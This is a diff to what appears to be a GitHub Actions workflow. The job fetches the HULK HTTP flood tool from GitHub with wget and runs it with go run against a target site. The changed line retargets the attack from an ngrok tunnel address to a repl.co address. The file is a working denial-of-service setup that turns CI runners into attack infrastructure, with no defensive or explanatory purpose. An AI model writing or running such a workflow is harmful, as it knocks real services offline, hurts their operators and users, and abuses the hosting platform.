@@ -16,4 +16,4 @@ jobs:
       run: |
         wget https://raw.githubusercontent.com/grafov/hulk/master/hulk.go
         go mod init hulk
-        go run hulk.go --site https://af72-106-207-92-229.ngrok-free.app
+        go run hulk.go --site https://python.happysingh76389.repl.co/
